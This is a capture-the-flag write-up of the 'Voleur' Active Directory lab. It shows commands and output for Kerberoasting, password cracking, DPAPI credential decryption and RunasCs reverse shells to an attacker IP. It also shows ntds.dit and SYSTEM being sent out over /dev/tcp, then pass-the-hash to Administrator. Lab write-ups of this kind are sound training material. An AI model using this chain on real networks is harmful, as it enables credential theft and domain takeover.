## Voleur

### Lab Details 

- Difficulty: Medium
- Type:  Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-23 11:40:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
54270/tcp open  msrpc         Microsoft Windows RPC
58941/tcp open  msrpc         Microsoft Windows RPC
58960/tcp open  msrpc         Microsoft Windows RPC
```
- given credential `ryan.naylor:HollowOct31Nyt`
- run `enum4linux-ng` with credential found domain `voleur.htb`
- getting authentication error message from `nxc` using the credential provided
```bash
$ netexec smb 10.129.86.27 -u ryan.naylor -p HollowOct31Nyt
SMB         10.129.86.27    445    10.129.86.27     [*]  x64 (name:10.129.86.27) (domain:10.129.86.27) (signing:True) (SMBv1:False)
SMB         10.129.86.27    445    10.129.86.27     [-] 10.129.86.27\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```
- from the message we can deduce that `NTLM` authentication is disabled
- we will need to use `Kerberos` Authentication instead
- use `impacket-getTGT` to get `Kerberos` ticket for user
```bash
$ impacket-getTGT -dc-ip voleur.htb voleur.htb/ryan.naylor:'HollowOct31Nyt'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache
```
- check ticket validity with `nxc`
```bash
$ nxc ldap voleur.htb -u ryan.naylor -p HollowOct31Nyt -k
LDAP        voleur.htb      389    DC.voleur.htb    [*]  x64 (name:DC.voleur.htb) (domain:voleur.htb) (signing:True) (SMBv1:False)
LDAP        voleur.htb      389    DC.voleur.htb    [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
```
- we get the target domain controller name from output `DC.voleur.htb`
- when attempt to enumerate `smb` using `nxc` getting error
```bash
$ nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt -k
SMB         dc.voleur.htb   445    dc.voleur.htb    [*]  x64 (name:dc.voleur.htb) (domain:dc.voleur.htb) (signing:True) (SMBv1:False)
SMB         dc.voleur.htb   445    dc.voleur.htb    [-] dc.voleur.htb\ryan.naylor:HollowOct31Nyt KDC_ERR_WRONG_REALM 
```
- attempt to use `impacket-smbclient` instead
```bash
$ impacket-smbclient -k voleur.htb/ryan.naylor:ryan.naylor@dc.voleur.htb
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use HR
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use Finance
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

# use IT

# tree 
/First-Line Support/Access_Review.xlsx
Finished - 2 files and folders
# cd First-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 03:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 03:10:01 2025 ..
-rw-rw-rw-      16896  Thu May 29 17:23:36 2025 Access_Review.xlsx
# mget Access_Review.xlsx
[*] Downloading Access_Review.xlsx

```
- attempt to open the `execel` file we get password prompt
```bash
$ office2john Access_Review.xlsx > hash
```
- we get plain text password `football1`
```bash
 john hash /usr/share/wordlists/rockyou.txt 
 football1        (Access_Review.xlsx)     
```
![[access review.png]]
#### Initial Foothold 
- looking through the file we see a user named `Todd.Wolfe` and user plain text password was set to `NightT1meP1dg3on14` and account was deleted 
- we can attempt to recover the account 
- further more there are two service accounts with plain text password exposed 
- `svc_ldap` and `svc_iis`
- check `svc_ldap` service account on bloodhound and found that it has `WriteSPN` access over `SVC_WINRM` 
![[svc_ldap bloodhound.png]]
- we can attempt to pivot to `SVC_WINRM` to get foothold to the system
- first lets get the `tgt` of user `svc_ldap`
```bash
$ getTGT.py voleur.htb/svc_ldap:M1XyC9pW7qT5Vn
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache
```
- then abuse th
```bash
$ KRB5CCNAME=./svc_ldap.ccache python3 ./targetedKerberoast/targetedKerberoast.py -d voleur.htb -k --no-pass --dc-host dc.voleur.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$cb3975cf21ec499892bbc635667830ba$4853843089e4075d4110dac34d462ab2513ce9d0c18bb80add799896bf3b382ad5fb10aed391d894f2b190dbdc5a1b51140675eadbe6467b5edcf2450724d718ceef0681271a1c6647b3fff1af616b921e14f23493db7a1c4dc64f9c88daeccb598b7000018ca7624ec959455373a38dcb336204e037b93ff5504b550d1d5f56494c2ee60d5bbd3cae85888a469dfb06cdea2506e2988123d9ed408fe18770236b6ff0f6be0214875ffc0d5c7c6fa51f3c6110f6596155e7d0a80d3757de7d0032f96a65ab2a3ff129250436da3ead4ad5500c256715c46cc0b557987d835d51551eb842362c923b59b5a618852c97ca13dbba26cd2a51bbd1266ba4d17170a210fc23f111ed9009d62557c1d1bf6774c20da378de39e60a5ac799367d51b8fce832226d263d4a811614096bc57ee7be812dbdc3272805e853698a309e517e35aaaf9b91130987ac32dcea5bd7c205737915cc8f54f77cff487373ba3db1196bc4c904de25cb9879978d7ccbd07356b655ce34e058ecc2a8bb99bb2e4bcc9fa04ea5cf2a78a3c37c316cfc149e9c1abbaa229c3c8fd3a382c54b3f1c2169a5aeb7ba65199196a170edf4685eee97d97ec35fa45ef57534c66a68805b042f87bf54b43a52fd0d90d47d649b4ad78cf54a57eeee6b32ce966b250f6559eb7d95e406db0c845a9be392aed8a6e93b57fe49b0a1cef5176768c2e33ca5d04b32e09ee4df2fdc561484ac6cfd25fd1578c6af46f5f973e7dfc8debb68b1f6238f419e63f66d63bef9a209f6505ead52f2303cdf93dc78295234983f094db3b880c7ad90ac955259f04276921523419ce3902d08a0d07be25f85630208522d61dc0e2ac7dd83a33358e7b793960572b49d76d3c6a784871957374d6ac75e1b66c86f4da2beb3ac2ffd19541bc3e9b511ea5b1684a134eea493de87e8b7d51827f4560bd03717661cd5f92897a4aa0a2073583f1fb1dec34e6f58c6022b5fe239db4b939653a7804832cf83cddf7df3c916dd9850f8912c1e68aeb9a6d6e05fdc72b30eebb408426cc0694bb555b8dccdbbe7c3f3191c6df992793bda03ba72fdffb84084717643db4cbe9917d516d6ad7b89432922f33381127fc98e60c5a1076036a3abd2754e7bd43d1d109bcf50bda255d234e959e1497ef5909215405b8de47b808c425ac58c78b583ba46fa8e1dab04555618ffab992a4d4552457fc6a1f37ba1af66feefd30d1b883f335755b3acd0a80cb35609381c6afd892d0dc8932d3302d6d2a2bcd6871b70e3c2d60bd8883bff41a6b3fed5899f765a7f33aa858fa6abc53259004f789abb9cf65a499e224cb6e3d140a30c017effa2b8c28cc710f49e6e07117dbfd248b5328046dde996cdb4cc468c8ee8e2170c6d891cf6334ac3302f5e30661a5aa16be8ed37637d52118caa216d311dc8abf141e70ed968de0286be8b19a3103cbfede86ae5f9837505287f0e87
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$76504d3b7c18dd90b9e70910dd506641$f710911f73fe97f2f1efd252a3947ddef475e9a3c4ad1f89c1d85147f6512d1f01c29169bd8180b3617bef3ef3a0e5dc9f0c0d4a1d4259bcc242866acc0b02f824e8de036d6829ccfce5e2e72bc8a6f92837fbf99b05decdb3fb516341ae00929e8f81e9afefa3474091e14886779fd0aeefe4f8a3de0a4c82898ce74f0b18a8d8b1cecfdf0ffdd3c79b5cfffe1cc2f618da816d87743d574f4fc65b3c9f31e688cc0038421b3da1517781a7361e83257c79b03254509b5f151c82bbede9414f06a5cc7d36c238ab19d62355decc1a5b132259fcf581143e69a95d5e1e183a4b011d8f2c863c239544fea1de8e3df3092f81f60ae0bb10494a65de305f1ea4ee412f9b500d3ea16d9bc1885cb1399da7d66bd9b4d259e467f53472706921b8d3164de7596d45deb0c38692ab192ec6653a81acfaa21610fa2346f477894576b4b4cff09f8fdf4b94e7a993e947ea8aaadfc86d854089d3fcbb32aef3cad4b69fc59d42172454da66d53eaa9779beb82f20e4e5069b5a5b7eddf07020a980d7192745b75ea21ba5534fbde6d28851a11aac72821a0e6611182a2d7f7f5331167edfe452719369c4cca534969e4f37098de686bb257f091f80fafd6dc50aa46f3050ecdcd6d59e5f2b288d07ca9ebe25973dbfecb10cb87ed722b007d02d704a8664f3036893fb4adcb35a33b09c806152f6aa4ee2c4166d4aa4a6916966b80f153b5fd8e918e8c235d735396005b56e5c773d0f039347948d540feff9b5c5a0490023188c781bdf24ea0fe51fe4b6ce1d947b160bab721ba1866f8ff661c1d841d6fb3dd431a96e94ae7c19ec2480cc87b6f005a9b43344d41895caa88d5f85cf90d113e7374fb4d5288ad899594038a6e2ca4e1fc01f4ff51f6011e80ed44a5a20f660bb18d950a4a2c33e2f79d99c732967f6e3d9f14b73606e8cbfff273658dd8c5434fb2b615be9459a8820390dde98f31d8952acee065357afbccfb5ef426cc3c46fd0ddd6ac72d42d0861c7471fb9a61ef3a2f227b7e1acdcfba5394f97bbd21c17128ce1e907b085e560e104c4bd0fd6c23631225e9540ce407b274181dfab0bc61e84e54c6891b420759430bbf7f7df4dd907d508425211bd590099d876150e554566b9934728d9f0882347cf0591aee9d29631ddc993ca1912303201b2422e5e1f67d7a30ad020fa540332e2ebcf90a74b0f8a3616b717a618856eaa4e0dcfd3c6203f7a841a79c45dc3583c3e6f8e4c87aa197daa908f45df61b797f1fda97069f1805fad3f57af34a89a1c91f4f43a6c9b7ad0952276c87b956cc5e321bece281487fae050972153ab942024fa8254478e843769b4991552c78e44ccde95fff269ae5290c9bf63dd0d302ffc0d0e0713559c60bc0ac8ac82a392b9e4162d121f4b18a864fd1de0b757cae64a4692f9bee19a444b6ef715c6ccb54136744ba31299b094ce88c31d0bdec3beef1048
```
- crack with the hashes with hashcat
```bash
$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
## cred for svc_winrm
svc_winrm:AFireInsidedeOzarctica980219afi
```
- unable to crack `lacey`'s hash 
- attempt to get `evil-winrm` access to target over `ntlm auth` but seems like the `ntlm auth` is disabled overall on target
- which means we will need to get a ticket as `svc_winrm` and get `evil-winrm` over `kerberos`
```bash
$ getTGT.py voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
```
- export the ticket and authenticate over `kerberos`
```bash
$ export KRB5CCNAME=./svc_winrm.ccache
$ evil-winrm -r voleur.htb -i dc.voleur.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents>
```
- `user.txt` file is in desktop directory of user `svc_winrm`
#### Lateral Movement (If any)
- we know at this point that `Todd.Wolfe`'s account is deleted, we can attempt to recover it
- however currently we don't have access to perform that action
```bash
*Evil-WinRM* PS C:\IT> ls


    Directory: C:\IT


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/29/2025   1:40 AM                First-Line Support
d-----         1/29/2025   7:13 AM                Second-Line Support
d-----         1/30/2025   8:11 AM                Third-Line Support
```
- checking bloodhound again, found `svc_ldap` service account belongs to `restore_users` group which has `GenericWrite` access over `lacey.miller`
```bash
.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn cmd -r 10.10.14.82:9001 -d voleur.htb
```

```bash
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects 
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects 


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=voleur,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8

Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```
```bash
Restore-ADObject -Identity "1c6b1deb-c372-4cbb-87b1-15031de169db" 
```

```bash
Todd.Wolfe:NightT1meP1dg3on14
```

```bash
$ getTGT.py voleur.htb/Todd.Wolfe:NightT1meP1dg3on14
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Todd.Wolfe.ccache
```

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe todd.wolfe NightT1meP1dg3on14 cmd -r 10.10.14.82:9002 -d voleur.htb
[*] Warning: The logon for user 'todd.wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-2d2a9a$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 5400 created in background.
```

```bash
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials> ls
ls


    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/29/2025   4:55 AM            398 772275FAD58525253490A9B0039791D3
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials> copy 772275FAD58525253490A9B0039791D3 z:
copy 772275FAD58525253490A9B0039791D3 z:
```

```bash
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110> ls -force
ls -force


    Directory: C:\IT\Second-Line Support\Archived 
    Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/29/2025   4:53 AM            740 08949382-134f-4c63-b93c-ce52efc0aa88                                 
-a-hs-         1/29/2025   4:53 AM            900 BK-VOLEUR                                                            
-a-hs-         1/29/2025   4:53 AM             24 Preferred  

PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110> copy 08949382-134f-4c63-b93c-ce52efc0aa88 z:
copy 08949382-134f-4c63-b93c-ce52efc0aa88 z:
```

-  crack the key with password
```bash
$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

- cracking the data with key
```bash
$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

```bash
$ getTGT.py voleur.htb/jeremy.combs:qT3V9pLXyN7W4m
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jeremy.combs.ccache
```

```
$ export KRB5CCNAME=./jeremy.combs.ccache 
$ nxc ldap dc.voleur.htb -u jeremy.combs -p qT3V9pLXyN7W4m -k
LDAP        dc.voleur.htb   389    DC.voleur.htb    [*]  x64 (name:DC.voleur.htb) (domain:voleur.htb) (signing:True) (SMBv1:False)
LDAP        dc.voleur.htb   389    DC.voleur.htb    [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m
```

```bash
$ rlwrap nc -lvnp 9003
listening on [any] 9003 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.81.79] 49903
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\jeremy.combs
```

```bash

PS C:\IT> cd 'Third-Line Support'
cd 'Third-Line Support'
PS C:\IT\Third-Line Support> ls
ls


    Directory: C:\IT\Third-Line Support


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         1/30/2025   8:11 AM                Backups                                                              
-a----         1/30/2025   8:10 AM           2602 id_rsa                                                               
-a----         1/30/2025   8:07 AM            186 Note.txt.txt  
```

```bash
PS C:\IT\Third-Line Support> cd Backups
cd Backups
PS C:\IT\Third-Line Support\Backups> ls
ls
ls : Access to the path 'C:\IT\Third-Line Support\Backups' is denied.
At line:1 char:1
+ ls
+ ~~
    + CategoryInfo          : PermissionDenied: (C:\IT\Third-Line Support\Backups:String) [Get-ChildItem], Unauthorize 
   dAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

```
$ cat Note.txt.txt 
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```
#### Privilege Escalation
- since we have the private key of a user from `smb` we can use it to `ssh` into the `wsl` instance
- we can use below command to get the public key of the private since it contains the username 
```bash
$ ssh-keygen -y -f ./id_rsa
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoXI8y9RFb+pvJGV6YAzNo9W99Hsk0fOcvrEMc/ij+GpYjOfd1nro/ZpuwyBnLZdcZ/ak7QzXdSJ2IFoXd0s0vtjVJ5L8MyKwTjXXMfHoBAx6mPQwYGL9zVR+LutUyr5fo0mdva/mkLOmjKhs41aisFcwpX0OdtC6ZbFhcpDKvq+BKst3ckFbpM1lrc9ZOHL3CtNE56B1hqoKPOTc+xxy3ro+GZA/JaR5VsgZkCoQL951843OZmMxuft24nAgvlzrwwy4KL273UwDkUCKCc22C+9hWGr+kuSFwqSHV6JHTVPJSZ4dUmEFAvBXNwc11WT4Y743OHJE6q7GFppWNw7wvcow9g1RmX9zii/zQgbTiEC8BAgbI28A+4RcacsSIpFw2D6a8jr+wshxTmhCQ8kztcWV6NIod+Alw/VbcwwMBgqmQC5lMnBI/0hJVWWPhH+V9bXy0qKJe7KA4a52bcBtjrkKU7A/6xjv6tc5MDacneoTQnyAYSJLwMXM84XzQ4us= svc_backup@DC
```
- the key is for `svc_backup`
- we can use the private key to ssh into the target 
```bash
$ ssh svc_backup@voleur.htb -i id_rsa -p 2222
```
- since we are in a `wsl` instance we can attempt to visit the `C:\` drive from `/mnt/c`
- which `C:\` is mounted 
```bash
svc_backup@DC:/mnt/c$ ls
ls: cannot access 'DumpStack.log.tmp': Permission denied
ls: cannot access 'pagefile.sys': Permission denied
'$Recycle.Bin'   Config.Msi                DumpStack.log.tmp   HR   PerfLogs        'Program Files (x86)'   Recovery                     Users     inetpub
'$WinREAgent'   'Documents and Settings'   Finance             IT  'Program Files'   ProgramData           'System Volume Information'   Windows   pagefile.sys
```

```bash
svc_backup@DC:~$ id
uid=1000(svc_backup) gid=1000(svc_backup) groups=1000(svc_backup),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
svc_backup@DC:~$ sudo -l
Matching Defaults entries for svc_backup on DC:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

```bash
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls
'Active Directory'   registry
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd registry/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls
SECURITY  SYSTEM
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ sudo cat ./SYSTEM > /dev/tcp/10.10.14.82/9000
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls
ntds.dit  ntds.jfm
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ sudo cat ./ntds.dit > /dev/tcp/10.10.14.82/9000
```

```bash
$ impacket-secretsdump -ntds ntds.dit -system SYSTEM local          
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
<SNIP>
```

```bash
$ getTGT.py voleur.htb/Administrator@voluer.htb -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator@voluer.htb.ccache
```

```bash
$ evil-winrm -i dc.voleur.htb -r voleur.htb -k ./Administrator@voluer.htb.ccache 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: Useless cert/s provided, SSL is not enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
#### Resources

#### Lesson Learned
